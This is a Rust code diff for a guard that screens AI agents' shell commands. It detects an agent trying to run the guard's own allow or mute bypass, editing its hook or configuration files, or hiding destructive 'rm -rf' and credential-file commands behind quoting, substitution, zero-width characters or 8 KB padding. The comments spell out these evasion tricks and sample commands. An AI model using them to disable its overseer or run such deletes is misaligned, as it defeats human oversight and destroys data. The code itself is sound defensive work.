@@ -606,21 +606,42 @@ fn dangerous_command_regexes() -> &'static [(regex::Regex, &'static str, bool)] 
 ///
 /// Returns `(what, score)`.
 pub fn check_guard_self_disable(content: &str) -> Option<(&'static str, u32)> {
-    if !mentions_any(
-        content,
-        &[
-            "innerwarden",
-            "settings.json",
-            ".claude.json",
-            "mcp.json",
-            "mcpservers",
-            "pretooluse",
-            "posttooluse",
-            "hooks",
-        ],
-    ) {
+    const NEEDLES: &[&str] = &[
+        "innerwarden",
+        "settings.json",
+        ".claude.json",
+        "mcp.json",
+        "mcpservers",
+        "pretooluse",
+        "posttooluse",
+        "hooks",
+    ];
+    if !mentions_any(content, NEEDLES) {
+        // A name assembled by the shell (`${x:-innerwarden}`, `$(echo
+        // innerwarden)`, `inner''warden`) only reads as one once rewritten.
+        // Without an expansion, a quote or an escape there is nothing to
+        // assemble, so the rewrite is skipped.
+        if !content.contains(['$', '`', '\'', '"', '\\']) {
+            return None;
+        }
+        let normalized = normalize_command(content);
+        if normalized == content || !mentions_any(&normalized, NEEDLES) {
+            return None;
+        }
+        return guard_self_disable_in(&normalized);
+    }
+    if let Some(hit) = guard_self_disable_in(content) {
+        return Some(hit);
+    }
+    let normalized = normalize_command(content);
+    if normalized == content {
         return None;
     }
+    guard_self_disable_in(&normalized)
+}
+
+/// [`check_guard_self_disable`] on one spelling of the command.
+fn guard_self_disable_in(content: &str) -> Option<(&'static str, u32)> {
     static RES: std::sync::OnceLock<Vec<(regex::Regex, &'static str, u32)>> =
         std::sync::OnceLock::new();
     let res = RES.get_or_init(|| {
@@ -718,13 +739,471 @@ pub fn check_guard_self_disable(content: &str) -> Option<(&'static str, u32)> {
     if let Some((_, what, score)) = res.iter().find(|(re, _, _)| re.is_match(content)) {
         return Some((*what, *score));
     }
-    let normalized = normalize_command(content);
-    if normalized == content {
+    if !content.to_ascii_lowercase().contains("innerwarden") {
         return None;
     }
-    res.iter()
-        .find(|(re, _, _)| re.is_match(&normalized))
-        .map(|(_, what, score)| (*what, *score))
+    if runs_guard_loosening_verb(content, 0) {
+        return Some((
+            "runs the guard's own allow, mute or monitor command, which only the person \
+             supervising the agent may run, from their own terminal",
+            60,
+        ));
+    }
+    if writes_guard_config(content, 0) {
+        return Some((
+            "writes into the guard's own configuration, which holds its allow and mute rules",
+            60,
+        ));
+    }
+    None
+}
+
+/// The flag an operator's own script passes to `innerwarden allow` / `mute`
+/// to run them without a terminal. It changes nothing for the guard: an agent
+/// that passes it is still running the guard's own bypass.
+pub const GUARD_OPERATOR_FLAG: &str = "--operator";
+
+/// Shells, whose `-c` argument is a command line.
+const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "mksh", "fish", "ash"];
+
+/// Words that run a later word as the command (`env`, `sudo`, `npx`, ...).
+/// Their options, and an option's value, sit between them and the command.
+const COMMAND_LAUNCHERS: &[&str] = &[
+    "env",
+    "sudo",
+    "doas",
+    "command",
+    "exec",
+    "nohup",
+    "setsid",
+    "time",
+    "timeout",
+    "nice",
+    "ionice",
+    "stdbuf",
+    "chronic",
+    "xargs",
+    "npx",
+    "bunx",
+    "pnpx",
+    "unbuffer",
+    "caffeinate",
+    "then",
+    "do",
+    "else",
+    "!",
+];
+
+/// Whether a command line runs `innerwarden allow`, `innerwarden mute` or
+/// `innerwarden dry-run`/`monitor` to widen what the guard lets through.
+///
+/// The command word is found the way the shell finds it, so a path
+/// (`/usr/local/bin/innerwarden`), quoting (`'innerwarden' allow`), a launcher
+/// (`env -u VAR innerwarden`, `sudo`, `npx`), a `sh -c` / `bash -lc` /
+/// `script -c` / `su -c` / `eval` string and text piped into a shell all
+/// count. The word `innerwarden` as an argument (`grep "innerwarden allow"
+/// docs/`, a commit message) does not.
+///
+/// Reading the lists (`allow --list`, a bare `allow`) and removing an entry
+/// (`--remove`, which only narrows) are not a loosening.
+fn runs_guard_loosening_verb(content: &str, depth: u8) -> bool {
+    if depth > 4 {
+        return false;
+    }
+    let segments = shell_command_segments(content);
+    for (index, segment) in segments.iter().enumerate() {
+        let words = shell_tokens(segment);
+        if words_run_guard_loosening_verb(&words, depth) {
+            return true;
+        }
+        // `echo 'innerwarden allow x' | sh`: the text is the command.
+        let piped_into_shell = segments.get(index + 1).is_some_and(|next| {
+            segments_are_piped(content, segment, next)
+                && shell_tokens(next).first().is_some_and(|shell| {
+                    SHELLS.contains(&token_basename(&shell.to_ascii_lowercase()))
+                })
+        });
+        if piped_into_shell
+            && words.first().is_some_and(|word| {
+                matches!(
+                    token_basename(&word.to_ascii_lowercase()),
+                    "echo" | "printf"
+                )
+            })
+            && runs_guard_loosening_verb(&words[1..].join(" "), depth + 1)
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// [`runs_guard_loosening_verb`] on the words of one simple command.
+fn words_run_guard_loosening_verb(words: &[String], depth: u8) -> bool {
+    words_run_guard_loosening_verb_fed(words, depth, false)
+}
+
+/// Words that run a later word as a command and hand it arguments of their
+/// own (from stdin, a list, or the files found): what they add to a bare
+/// `innerwarden allow` is a pattern the text does not show.
+const ARGUMENT_FEEDERS: &[&str] = &["xargs", "parallel"];
+
+/// [`words_run_guard_loosening_verb`], with `fed` set when a word before the
+/// command (`xargs`, `parallel`, `find -exec`) supplies arguments of its own.
+fn words_run_guard_loosening_verb_fed(words: &[String], depth: u8, mut fed: bool) -> bool {
+    let mut after_option = false;
+    // `$(echo innerwarden) allow x` and `` `echo innerwarden` allow x ``: the
+    // substitution's output is the command word.
+    let mut in_substitution = false;
+    for (index, word) in words.iter().enumerate() {
+        let dollar = word == "$";
+        let lower = word.to_ascii_lowercase();
+        let lower = lower.trim_matches('`');
+        let base = token_basename(lower);
+        let base = base.strip_suffix(".exe").unwrap_or(base);
+        if base == "innerwarden" {
+            let arguments = &words[index + 1..];
+            return guard_verb_loosens(arguments) || (fed && guard_verb_is_fed(arguments));
+        }
+        if base == "find" {
+            // `find ... -exec innerwarden allow {} \;`: the command after
+            // `-exec` runs once per file found, with the file as an argument.
+            return words[index + 1..]
+                .iter()
+                .position(|w| matches!(w.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir"))
+                .is_some_and(|at| {
+                    let command: Vec<String> = words[index + 2 + at..]
+                        .iter()
+                        .take_while(|w| !matches!(w.as_str(), ";" | "+"))
+                        .cloned()
+                        .collect();
+                    words_run_guard_loosening_verb_fed(&command, depth, true)
+                });
+        }
+        if ARGUMENT_FEEDERS.contains(&base) {
+            fed = true;
+            after_option = false;
+            in_substitution = false;
+            continue;
+        }
+        if SHELLS.contains(&base) || matches!(base, "script" | "su") {
+            return command_string_argument(base, &words[index + 1..])
+                .is_some_and(|payload| runs_guard_loosening_verb(payload, depth + 1));
+        }
+        if base == "eval" {
+            return runs_guard_loosening_verb(&words[index + 1..].join(" "), depth + 1);
+        }
+        if matches!(base, "npm" | "pnpm" | "yarn" | "bun")
+            && words
+                .get(index + 1)
+                .is_some_and(|next| matches!(next.as_str(), "exec" | "dlx" | "x"))
+        {
+            after_option = true;
+            continue;
+        }
+        let skippable = after_option
+            || dollar
+            || (in_substitution || word.starts_with('`')) && matches!(base, "echo" | "printf")
+            || is_environment_assignment(word)
+            || word.starts_with('-')
+            || COMMAND_LAUNCHERS.contains(&base)
+            || lower
+                .trim_end_matches(['s', 'm', 'h', 'd'])
+                .parse::<f64>()
+                .is_ok();
+        if !skippable {
+            return false;
+        }
+        after_option = word.starts_with('-') && !word.contains('=') && !after_option;
+        in_substitution = dollar;
+    }
+    false
+}
+
+/// The command string a shell (`-c`), `script` (`-c`, `--command`) or `su`
+/// (`-c`, `--command`) runs, when it is given one.
+fn command_string_argument<'a>(runner: &str, arguments: &'a [String]) -> Option<&'a str> {
+    let mut rest = arguments.iter();
+    while let Some(argument) = rest.next() {
+        let short_c = argument
+            .strip_prefix('-')
+            .is_some_and(|flags| !flags.starts_with('-') && flags.contains('c'));
+        if short_c || argument == "--command" {
+            return rest.next().map(String::as_str);
+        }
+        if let Some(command) = argument.strip_prefix("--command=") {
+            return Some(command);
+        }
+        if matches!(argument.as_str(), "-o" | "+o" | "-O" | "+O") {
+            rest.next();
+            continue;
+        }
+        // A script file (`bash build.sh`) is not a command string; `su` takes
+        // the account name first.
+        if !argument.starts_with(['-', '+']) && runner != "su" {
+            return None;
+        }
+    }
+    None
+}
+
+/// The arguments after `innerwarden`, when something before it adds more:
+/// whether they name `allow` or `mute` with nothing that keeps them reading
+/// (`--list`, `--remove`, help). A bare verb fed a pattern widens.
+fn guard_verb_is_fed(arguments: &[String]) -> bool {
+    let arguments = match arguments.first() {
+        Some(first) if first == "--" => &arguments[1..],
+        _ => arguments,
+    };
+    let Some(verb) = arguments.first() else {
+        return false;
+    };
+    matches!(verb.to_ascii_lowercase().as_str(), "allow" | "mute")
+        && !arguments[1..]
+            .iter()
+            .any(|a| matches!(a.as_str(), "--list" | "--remove" | "--help" | "-h"))
+}
+
+/// The arguments after `innerwarden`: whether they widen what is let through.
+fn guard_verb_loosens(arguments: &[String]) -> bool {
+    // `npm exec innerwarden -- allow x`: the `--` belongs to the launcher.
+    let arguments = match arguments.first() {
+        Some(first) if first == "--" => &arguments[1..],
+        _ => arguments,
+    };
+    let Some(verb) = arguments.first() else {
+        return false;
+    };
+    let rest: Vec<&str> = arguments[1..]
+        .iter()
+        .map(String::as_str)
+        .filter(|argument| *argument != GUARD_OPERATOR_FLAG)
+        .collect();
+    let asks_for_help = rest
+        .iter()
+        .any(|argument| matches!(*argument, "--help" | "-h"));
+    match verb.to_ascii_lowercase().as_str() {
+        "allow" | "mute" => {
+            !asks_for_help
+                && rest
+                    .first()
+                    .is_some_and(|first| !matches!(*first, "--list" | "--remove"))
+        }
+        "dry-run" | "monitor" => !asks_for_help,
+        _ => false,
+    }
+}
+
+/// Whether a command line writes into the guard's own configuration directory
+/// (`~/.config/innerwarden/`), which holds its allow and mute rules, its agent
+/// policy and its record. Reading it is not a write.
+///
+/// A write is an output redirection, `tee`, a copy, link or move into it, a
+/// move or removal of something in it, an in-place `sed`/`perl` edit, `dd
+/// of=`, or interpreter code that names it and writes. The directory is
+/// recognised as `~/`, `$HOME/`, `${HOME}/`, `$XDG_CONFIG_HOME/`, an absolute
+/// home, a path relative to a `cd` into it, or a variable assigned it earlier
+/// in the same command.
+fn writes_guard_config(content: &str, depth: u8) -> bool {
+    if depth > 4 {
+        return false;
+    }
+    let variables = variables_naming_guard_config(content);
+    let counts = |target: &str, cwd: Option<&str>| {
+        let target = target.trim().trim_matches(['"', '\'']);
+        if target.is_empty() {
+            return false;
+        }
+        if names_guard_config(target) {
+            return true;
+        }
+        let lower = target.to_ascii_lowercase();
+        if let Some(name) = lower.strip_prefix('$') {
+            let name = name.trim_start_matches('{');
+            return variables.iter().any(|variable| {
+                name.strip_prefix(variable.as_str()).is_some_and(|rest| {
+                    !rest.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_')
+                })
+            });
+        }
+        !lower.starts_with(['/', '~'])
+            && cwd.is_some_and(|dir| names_guard_config(&format!("{dir}/{target}")))
+    };
+
+    let (redirects, _) = shell_output_redirect_targets(content);
+    if redirects.iter().any(|target| counts(target, None)) {
+        return true;
+    }
+    // `${NAME}` as `$NAME`: the tokenizer splits words at braces.
+    static BRACED: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let braced = BRACED.get_or_init(|| {
+        regex::Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}").expect("static braced variable regex")
+    });
+    let mut cwd: Option<String> = None;
+    for segment in shell_command_segments(content) {
+        let words = shell_tokens(&braced.replace_all(segment, "$$$1"));
+        let mut targets = output_redirect_targets(&words);
+        let Some(command_index) = effective_command_index(&words) else {
+            if targets.iter().any(|target| counts(target, cwd.as_deref())) {
+                return true;
+            }
+            continue;
+        };
+        let name = token_basename(&words[command_index]).to_ascii_lowercase();
+        let command = strip_interpreter_version(&name);
+        let arguments = &words[command_index + 1..];
+        let positional: Vec<&String> = arguments
+            .iter()
+            .filter(|argument| !argument.starts_with('-') && !argument.contains('>'))
+            .collect();
+        if SHELLS.contains(&command) || matches!(command, "script" | "su") {
+            if command_string_argument(command, arguments)
+                .is_some_and(|payload| writes_guard_config(payload, depth + 1))
+            {
+                return true;
+            }
+        } else if command == "eval" && writes_guard_config(&arguments.join(" "), depth + 1) {
+            return true;
+        }
+        match command {
+            "cd" | "pushd" => {
+                cwd = Some(
+                    positional
+                        .first()
+                        .map(|dir| dir.to_string())
+                        .unwrap_or_else(|| "~".into()),
+                );
+                continue;
+            }
+            "tee" => targets.extend(tee_write_targets(&words)),
+            "mv" | "rm" | "unlink" | "shred" | "truncate" | "rmdir" => {
+                targets.extend(positional.iter().map(|path| path.to_string()));
+            }
+            "cp" | "install" | "ln" | "rsync" => {
+                // A link to the configuration under another name (`ln -s
+                // ~/.config/innerwarden /tmp/c`) is a path that writes into it
+                // without naming it; making one is the write.
+                if command == "ln" && positional.iter().any(|path| counts(path, cwd.as_deref())) {
+                    return true;
+                }
+                let explicit = arguments.iter().enumerate().find_map(|(at, argument)| {
+                    if argument == "-t" {
+                        arguments.get(at + 1).cloned()
+                    } else {
+                        argument
+                            .strip_prefix("--target-directory=")
+                            .map(str::to_string)
+                    }
+                });
+                match explicit {
+                    Some(directory) => targets.push(directory),
+                    None if positional.len() >= 2 => {
+                        targets.extend(positional.last().map(|path| path.to_string()));
+                    }
+                    None => {}
+                }
+            }
+            "sed" | "gsed" | "perl" => {
+                let in_place = arguments.iter().any(|argument| {
+                    argument.starts_with("--in-place")
+                        || argument.strip_prefix('-').is_some_and(|flags| {
+                            !flags.starts_with('-')
+                                && flags
+                                    .chars()
+                                    .take_while(|c| c.is_ascii_alphabetic())
+                                    .any(|c| c == 'i')
+                        })
+                });
+                if in_place {
+                    targets.extend(positional.iter().map(|path| path.to_string()));
+                }
+                if command == "perl" && interpreter_code_writes_guard_config("perl", arguments) {
+                    return true;
+                }
+            }
+            "dd" => targets.extend(dd_operand(arguments, "of").map(str::to_string)),
+            "python" | "py" | "node" | "nodejs" | "ruby" | "php"
+                if interpreter_code_writes_guard_config(command, arguments) =>
+            {
+                return true;
+            }
+            _ => {}
+        }
+        if targets.iter().any(|target| counts(target, cwd.as_deref())) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Shell variables a command assigns a path in the guard's configuration
+/// directory (`d=~/.config/innerwarden`), lowercase, so a later `> $d/x` is
+/// read as the write it is.
+fn variables_naming_guard_config(content: &str) -> Vec<String> {
+    static ASSIGNMENT: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let assignment = ASSIGNMENT.get_or_init(|| {
+        regex::Regex::new(r#"(?i)(?:^|[\s;&|(])([a-z_][a-z0-9_]*)=("[^"]*"|'[^']*'|[^\s;&|]*)"#)
+            .expect("static assignment regex")
+    });
+    assignment
+        .captures_iter(content)
+        .filter(|captures| names_guard_config(&captures[2]))
+        .map(|captures| captures[1].to_ascii_lowercase())
+        .collect()
+}
+
+/// Whether a path names the guard's configuration directory or a file in it.
+fn names_guard_config(target: &str) -> bool {
+    let unquoted: String = target
+        .chars()
+        .filter(|c| !matches!(c, '"' | '\''))
+        .collect();
+    let lower = unquoted.trim().to_ascii_lowercase();
+    let mut spelled = lower.clone();
+    for (variable, replacement) in [
+        ("${home}", "~"),
+        ("$home", "~"),
+        ("${xdg_config_home}", "~/.config"),
+        ("$xdg_config_home", "~/.config"),
+    ] {
+        if let Some(rest) = lower.strip_prefix(variable) {
+            if rest.is_empty() || rest.starts_with('/') {
+                spelled = format!("{replacement}{rest}");
+                break;
+            }
+        }
+    }
+    named_path(&spelled).is_some_and(|named| Place::Components(".config/innerwarden").holds(&named))
+}
+
+/// Inline interpreter code that names the guard's configuration directory
+/// and writes, or that runs `innerwarden allow` / `mute` through a subprocess.
+fn interpreter_code_writes_guard_config(interpreter: &str, arguments: &[String]) -> bool {
+    let Some(code) = interpreter_inline_code(interpreter, arguments) else {
+        return false;
+    };
+    let code = code.to_ascii_lowercase();
+    if !code.contains("innerwarden") {
+        return false;
+    }
+    static NAMES: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    static WRITES: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    static RUNS: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let names = NAMES.get_or_init(|| {
+        regex::Regex::new(r#"\.config\W{1,8}innerwarden|xdg_config_home\W{1,24}innerwarden"#)
+            .expect("static config path regex")
+    });
+    let writes = WRITES.get_or_init(|| {
+        regex::Regex::new(
+            r#"["'](?:w|a|x|wb|ab|w\+|a\+|r\+)["']|\bwrite|\bdump\b|filesync|appendfile|copyfile|copy2?\(|\bunlink|\bremove\(|\brmtree|\brename|\breplace\(|\bmove\(|\btruncate|file_put_contents|\bopen\(.{0,200}>"#,
+        )
+        .expect("static interpreter write regex")
+    });
+    let runs = RUNS.get_or_init(|| {
+        regex::Regex::new(r#"\binnerwarden\b["']?\s*,?\s*["']?(?:allow|mute|dry-run|monitor)\b"#)
+            .expect("static interpreter subprocess regex")
+    });
+    (names.is_match(&code) && writes.is_match(&code)) || runs.is_match(&code)
 }
 
 /// Cheap literal gate in front of a regex family.
@@ -874,7 +1353,14 @@ pub fn check_local_credential_and_kernel_tamper(content: &str) -> Option<(&'stat
 /// unexpanded variable in an `rm -rf` target is caught on its own: nothing here
 /// can know what `$DEPLOY_ROOT` holds, and neither could the person who typed
 /// it, which is exactly why it deserves a human.
+///
+/// `$HOME` is the exception, because its value is not hidden: it is the home
+/// of the user the agent runs as. `rm -rf "$HOME/.cache/x"` is a scoped
+/// cleanup, and the home itself (`rm -rf "$HOME"`, `$HOME/*`) is judged by
+/// [`destructive_rm_home`]. See [`with_home_named`] for when it is not.
 pub fn check_data_destruction(content: &str) -> Option<(&'static str, u32)> {
+    let content = with_home_named(content);
+    let content = content.as_ref();
     if !mentions_any(
         content,
         &[
@@ -958,6 +1444,28 @@ pub fn check_data_destruction(content: &str) -> Option<(&'static str, u32)> {
     res.iter()
         .find(|(re, _)| re.is_match(&normalized))
         .map(|(_, what)| (*what, 60))
+}
+
+/// `$HOME` and `${HOME}` written as a path under the home, so a delete under
+/// it is not mistaken for one whose target cannot be seen.
+///
+/// Only the uppercase name, whole (`$HOMEDIR` and `$home` are other, usually
+/// unset, variables), and only when nothing else in the text names `HOME`:
+/// `HOME=/ ; rm -rf $HOME/etc` or `export HOME=...` change what it holds, and
+/// the text is then judged as written.
+fn with_home_named(content: &str) -> std::borrow::Cow<'_, str> {
+    static HOME_VARIABLE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    if !content.contains("HOME") {
+        return std::borrow::Cow::Borrowed(content);
+    }
+    let home = HOME_VARIABLE.get_or_init(|| {
+        regex::Regex::new(r"\$\{HOME\}|\$HOME\b").expect("static home-variable regex")
+    });
+    let named = home.replace_all(content, "/home/~");
+    if named.contains("HOME") {
+        return std::borrow::Cow::Borrowed(content);
+    }
+    std::borrow::Cow::Owned(named.into_owned())
 }
 
 /// Anti-forensics: removing the record of what happened.
@@ -1543,15 +2051,158 @@ pub fn check_credentials(content: &str) -> Option<&'static str> {
     None
 }
 
+/// The largest piece of a command [`normalize_command`] rewrites in one go. The
+/// rewrite passes are bounded per piece, so a long command costs work linear in
+/// its length instead of an unbounded amount on a pathological input.
+const NORMALIZE_BLOCK_BYTES: usize = 8192;
+
+/// How far a forced cut (a piece with no command boundary to cut at) is
+/// repeated at the start of the next piece, so an obfuscated word that straddles
+/// the cut is still rewritten whole in one of the two.
+const NORMALIZE_BLOCK_OVERLAP: usize = 1024;
+
 /// De-obfuscate a shell command the way the shell itself would, WITHOUT
 /// executing it, so [`check_command`] sees the real command behind GuardFall
 /// shell-rewrite obfuscation: empty-quote insertion (`r''m`), `$IFS`
 /// word-splitting (`rm$IFS-rf`), command substitution (`$(echo rm)`), variable
 /// indirection (`${x:-rm}`), and backslash escapes (`\r\m`). Pure string
 /// transformation - it NEVER spawns a shell or evaluates the input. Bounded to a
-/// few passes and a max length so nested obfuscation resolves without unbounded
-/// work or a DoS on a pathological input.
+/// few passes per [`NORMALIZE_BLOCK_BYTES`] piece so nested obfuscation
+/// resolves without unbounded work or a DoS on a pathological input.
+///
+/// A command longer than one piece is rewritten piece by piece and EVERY piece
+/// is kept. It used to be cut at the first 8 KB, which hid whatever followed
+/// (`echo <8 KB>; ${x:-rm} -rf /` was judged on the padding alone), and the cut
+/// was by byte, so a multi-byte character across it panicked. Pieces end at a
+/// command boundary (an unquoted newline, `;`, `|` or `&`) whenever one is in
+/// reach, and are then joined back verbatim, so the command structure the
+/// checks parse is kept (a substitution that spans a piece boundary is the
+/// exception: each piece rewrites only the part it holds). Only a single
+/// command longer than a piece is cut without a boundary; that cut lands on a
+/// char boundary, and the next piece repeats up to [`NORMALIZE_BLOCK_OVERLAP`]
+/// bytes before it, starting at a word, joined by a space so the repeated
+/// words stay arguments of the same command and never start a new one.
 pub fn normalize_command(cmd: &str) -> String {
+    // Strip zero-width / invisible characters first: they are used to break a
+    // literal a matcher keys on (`/etc/sh<ZWSP>adow`, `rm -r<ZWSP>f /`, `cur<ZWSP>l`)
+    // and have no legitimate place in a shell command.
+    let s: String = cmd
+        .chars()
+        .filter(|c| {
+            !matches!(
+                *c,
+                '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{2060}' | '\u{FEFF}' | '\u{00AD}'
+            )
+        })
+        .collect();
+    if s.len() <= NORMALIZE_BLOCK_BYTES {
+        return normalize_block(s);
+    }
+    let mut out = String::with_capacity(s.len() + s.len() / 4);
+    for (start, end, after_forced_cut) in normalize_blocks(&s) {
+        if after_forced_cut {
+            // The overlap repeats text that the previous piece already ended
+            // with. A space keeps the two copies from fusing into one word; a
+            // newline would make the repeated words a command of their own.
+            out.push(' ');
+        }
+        out.push_str(&normalize_block(s[start..end].to_string()));
+    }
+    out
+}
+
+/// The byte offset at or below `index` that is a char boundary of `s`.
+fn floor_char_boundary(s: &str, index: usize) -> usize {
+    if index >= s.len() {
+        return s.len();
+    }
+    let mut at = index;
+    while at > 0 && !s.is_char_boundary(at) {
+        at -= 1;
+    }
+    at
+}
+
+/// Cut `s` (longer than one piece) into the `(start, end, after_forced_cut)`
+/// pieces [`normalize_command`] rewrites. Every byte of `s` is in at least one
+/// piece and every offset is a char boundary. A piece ends just after the last
+/// unquoted command separator within [`NORMALIZE_BLOCK_BYTES`]; with none in
+/// reach it ends at the limit and the next piece starts
+/// [`NORMALIZE_BLOCK_OVERLAP`] bytes earlier, flagged `after_forced_cut`.
+fn normalize_blocks(s: &str) -> Vec<(usize, usize, bool)> {
+    // Offsets just after an unquoted separator, in order. Quote tracking is a
+    // preference, not a guarantee: a wrong guess only moves where a piece ends,
+    // and every rewrite is local to a few bytes that never contain a separator,
+    // except substitutions, whose inner commands are each still a whole segment.
+    let bytes = s.as_bytes();
+    let mut boundaries = Vec::new();
+    let (mut single, mut double, mut escaped) = (false, false, false);
+    for (index, &byte) in bytes.iter().enumerate() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if single {
+            single = byte != b'\'';
+            continue;
+        }
+        match byte {
+            b'\\' => escaped = true,
+            b'\'' if !double => single = true,
+            b'"' => double = !double,
+            b'\n' | b';' | b'|' | b'&' if !double => boundaries.push(index + 1),
+            _ => {}
+        }
+    }
+
+    let mut pieces = Vec::new();
+    let mut start = 0usize;
+    let mut after_forced_cut = false;
+    let mut next_boundary = 0usize;
+    while start < s.len() {
+        let limit = start + NORMALIZE_BLOCK_BYTES;
+        if limit >= s.len() {
+            pieces.push((start, s.len(), after_forced_cut));
+            break;
+        }
+        while next_boundary < boundaries.len() && boundaries[next_boundary] <= start {
+            next_boundary += 1;
+        }
+        let mut last = None;
+        let mut probe = next_boundary;
+        while probe < boundaries.len() && boundaries[probe] <= limit {
+            last = Some(boundaries[probe]);
+            probe += 1;
+        }
+        if let Some(end) = last {
+            pieces.push((start, end, after_forced_cut));
+            start = end;
+            after_forced_cut = false;
+        } else {
+            let end = floor_char_boundary(s, limit);
+            pieces.push((start, end, after_forced_cut));
+            start = overlap_start(s, end);
+            after_forced_cut = true;
+        }
+    }
+    pieces
+}
+
+/// Where the piece after a forced cut at `end` starts: just after the first
+/// unescaped space or tab within [`NORMALIZE_BLOCK_OVERLAP`] bytes before
+/// `end`, so it starts at a word and never right after a backslash; with
+/// none, the char boundary that far back. A word that straddles `end` starts
+/// after the last such space, so it is always whole in the next piece.
+fn overlap_start(s: &str, end: usize) -> usize {
+    let floor = floor_char_boundary(s, end - NORMALIZE_BLOCK_OVERLAP);
+    let bytes = s.as_bytes();
+    (floor..end)
+        .find(|&i| matches!(bytes[i], b' ' | b'\t') && (i == 0 || bytes[i - 1] != b'\\'))
+        .map_or(floor, |space| space + 1)
+}
+
+/// The rewrite passes of [`normalize_command`] over one piece of a command.
+fn normalize_block(mut s: String) -> String {
     static SUBST: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
     static BACKTICK: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
     static VARDEF: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
@@ -1565,22 +2216,6 @@ pub fn normalize_command(cmd: &str) -> String {
     // A backslash before a word char is a no-op in the shell (`\r` -> `r`).
     let backslash = BACKSLASH.get_or_init(|| regex::Regex::new(r"\\([A-Za-z0-9])").unwrap());
 
-    // Strip zero-width / invisible characters first: they are used to break a
-    // literal a matcher keys on (`/etc/sh<ZWSP>adow`, `rm -r<ZWSP>f /`, `cur<ZWSP>l`)
-    // and have no legitimate place in a shell command.
-    let mut s: String = cmd
-        .chars()
-        .filter(|c| {
-            !matches!(
-                *c,
-                '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{2060}' | '\u{FEFF}' | '\u{00AD}'
-            )
-        })
-        .collect();
-    // Cap length so a pathological input cannot blow up the passes.
-    if s.len() > 8192 {
-        s.truncate(8192);
-    }
     for _ in 0..5 {
         let before = s.clone();
         // Unwrap command substitution + backticks, keeping the INNER command
@@ -1618,10 +2253,10 @@ pub fn strip_shell_noops(cmd: &str) -> String {
     static BACKSLASH: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
     let backslash =
         BACKSLASH.get_or_init(|| regex::Regex::new(r"\\([A-Za-z0-9])").expect("static backslash"));
-    // No length cap here (unlike normalize_command): every operation is linear in
-    // the input and there is no superlinear substitution unwrapping, so a big input
-    // is cheap. Truncating would DROP the tail of a long command, letting an attacker
-    // hide the dangerous part behind 8 KB of padding.
+    // No pieces here (unlike normalize_command): every operation is linear in the
+    // input and there is no superlinear substitution unwrapping, so a big input is
+    // cheap in one go. Truncating would DROP the tail of a long command, letting an
+    // attacker hide the dangerous part behind 8 KB of padding.
     let mut s: String = cmd
         .chars()
         .filter(|c| {
@@ -2036,27 +2671,34 @@ fn rm_target_is_root_or_system(target: &str) -> bool {
     matches!(&rest[first.len()..], "" | "/" | "/*" | "*")
 }
 
-/// Does a single shell command segment run `rm` (behind sudo/env/timeout wrappers)
-/// with recursive AND force flags AND a root/system target, all belonging to that
-/// one `rm` invocation? `--no-preserve-root` on the rm counts on its own.
-fn segment_is_root_wipe(segment: &str) -> bool {
+/// One `rm` invocation read from a shell command segment: whether it is
+/// recursive AND forced, whether it carries `--no-preserve-root`, and its
+/// operands, all belonging to that one `rm` (behind sudo/env/timeout wrappers).
+struct RmInvocation {
+    recursive_force: bool,
+    no_preserve: bool,
+    targets: Vec<String>,
+}
+
+/// Read the `rm` a segment runs, or `None` when the segment runs something
+/// else (`echo rm -rf /`). See [`fold_braced_names`] for `${HOME}`.
+fn segment_rm_invocation(segment: &str) -> Option<RmInvocation> {
     // A substitution before the command word expands away; see
     // `strip_leading_substitutions` for why only the leading ones go.
-    let segment = strip_leading_substitutions(segment);
-    let tokens = shell_tokens(segment);
-    let Some(rm_idx) = rm_command_index(&tokens) else {
-        return false;
-    };
+    let folded = fold_braced_names(strip_leading_substitutions(segment));
+    let segment = fold_home_expansions(&folded);
+    let tokens = shell_tokens(&segment);
+    let rm_idx = rm_command_index(&tokens)?;
 
     let mut recursive = false;
     let mut force = false;
     let mut no_preserve = false;
-    let mut targets: Vec<&str> = Vec::new();
+    let mut targets: Vec<String> = Vec::new();
     let mut opts_done = false;
 
     for arg in &tokens[rm_idx + 1..] {
         if opts_done {
-            targets.push(arg);
+            targets.push(arg.clone());
             continue;
         }
         match arg.as_str() {
@@ -2074,11 +2716,133 @@ fn segment_is_root_wipe(segment: &str) -> bool {
                     }
                 }
             }
-            _ => targets.push(arg),
+            _ => targets.push(arg.clone()),
         }
     }
+    Some(RmInvocation {
+        recursive_force: recursive && force,
+        no_preserve,
+        targets,
+    })
+}
 
-    no_preserve || (recursive && force && targets.iter().any(|t| rm_target_is_root_or_system(t)))
+/// Does a single shell command segment run `rm` (behind sudo/env/timeout wrappers)
+/// with recursive AND force flags AND a root/system target, all belonging to that
+/// one `rm` invocation? `--no-preserve-root` on the rm counts on its own.
+fn segment_is_root_wipe(segment: &str) -> bool {
+    let Some(rm) = segment_rm_invocation(segment) else {
+        return false;
+    };
+    rm.no_preserve
+        || (rm.recursive_force && rm.targets.iter().any(|t| rm_target_is_root_or_system(t)))
+}
+
+/// Does a single shell command segment run a recursive, forced `rm` of a home
+/// directory itself or all of its contents (see [`rm_target_is_home`])?
+fn segment_is_home_wipe(segment: &str) -> bool {
+    segment_rm_invocation(segment)
+        .is_some_and(|rm| rm.recursive_force && rm.targets.iter().any(|t| rm_target_is_home(t)))
+}
+
+/// Drop what makes an `rm` target mean "everything inside" rather than a path
+/// of its own: a trailing `/`, `/.`, and a last component that is nothing but
